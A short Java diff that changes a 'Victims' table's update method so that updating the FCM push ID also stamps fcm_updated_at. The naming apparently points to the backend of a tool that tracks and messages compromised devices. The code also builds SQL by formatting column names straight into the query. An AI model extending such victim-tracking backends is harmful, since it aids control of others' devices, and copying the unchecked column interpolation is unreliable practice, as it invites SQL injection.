@@ -155,7 +155,13 @@ public class Victims extends BaseTable<Victim> {
     @Override
     public boolean update(String whereColumn, String whereColumnValue, String updateColumn, String newUpdateColumnValue) {
 
-        final String query = String.format("UPDATE victims SET %s = ? WHERE %s = ?", updateColumn, whereColumn);
+        String queryFormat = "UPDATE victims SET %s = ? ";
+        if (updateColumn.equals(COLUMN_FCM_ID)) {
+            queryFormat += ", fcm_updated_at = NOW() ";
+        }
+        queryFormat += "WHERE %s = ?";
+
+        final String query = String.format(queryFormat, updateColumn, whereColumn);
 
         boolean isVictimUpdated = false;
         final java.sql.Connection connection = Connection.getConnection();
